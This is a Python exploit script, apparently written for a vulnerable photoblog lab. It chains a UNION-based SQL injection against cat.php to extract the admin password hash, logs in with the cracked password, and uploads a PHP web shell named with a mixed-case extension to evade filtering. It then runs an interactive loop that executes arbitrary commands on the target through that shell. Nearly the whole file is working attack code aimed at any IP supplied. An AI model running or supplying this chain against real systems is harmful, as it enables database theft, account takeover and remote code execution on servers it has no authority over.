import requests
import sys
from bs4 import BeautifulSoup
session = requests.Session()

if len(sys.argv) != 2:
    print("#Made By-Vanshal Gaur Twitter-@vanshalg\n"
    "\n\nUSAGE: python " + sys.argv[0] + " TARGET_IP")
    sys.exit(-0)
    
targetIP = sys.argv[1]
parameters = "id=1%20UNION%20SELECT%201,password,3,4%20FROM%20photoblog.users"
print("Injecting the sql injection payload\n:  id=1 UNION SELECT 1,password,3,4 FROM photoblog.users\n\n" )
r = requests.get('http://' + targetIP + '/cat.php', params=parameters,verify=False)
print("Retriving the admin password")
bsh = BeautifulSoup(r.text, 'html.parser')
print(bsh.find_all("img"))
print("\n\nadmin hash: 8efe310f9ab3efeae8d410a8e0166eb2 \n\n Decoded is P4ssw0rd\n\n")
# decoded P4ssw0rd
print("Logging in  using P4ssw0rd on http://" + targetIP + "/admin/login.php\n\n")

login_url = "http://" + targetIP + "/admin/index.php"
all_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + targetIP + "/", "Connection": "close", "Referer": "http://" + targetIP + "/admin/login.php", "Upgrade-Insecure-Requests": "1"}
postData = {"user": "admin", "password": "P4ssw0rd"}
a = session.post(login_url, headers=all_headers, data=postData)


my_url = "http://" + targetIP + "/admin/index.php"
my_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------52032921040974910862755582852", "Origin": "http://" + targetIP + "/", "Connection": "close", "Referer": "http://" + targetIP + "/admin/new.php", "Upgrade-Insecure-Requests": "1"}
my_data = "-----------------------------52032921040974910862755582852\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nCommand injection\r\n-----------------------------52032921040974910862755582852\r\nContent-Disposition: form-data; name=\"image\"; filename=\"shell1.PhP\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------52032921040974910862755582852\r\nContent-Disposition: form-data; name=\"category\"\r\n\r\n1\r\n-----------------------------52032921040974910862755582852\r\nContent-Disposition: form-data; name=\"Add\"\r\n\r\nAdd\r\n-----------------------------52032921040974910862755582852--\r\n"
session.post(my_url, headers=my_headers, data=my_data)


print("Uploded php command injection file successfully\n")
print("file located in /admin/uploads folder\n")


while True:
    command = str(input('sql_to_rce_shell$ '))
    if command == "exit" or command == "quit":
        print("Goodbye.")
        exit(0)
    elif not command:
        print("\nPlease type a command")
        continue
    injection = requests.get('http://' + targetIP + '/admin/uploads/shell1.PhP?cmd='+ command)
    print(injection.text)
    if r.status_code == 200:
        pattern = r.text
        print(command)
    else:
        print("Failed")
        exit(0)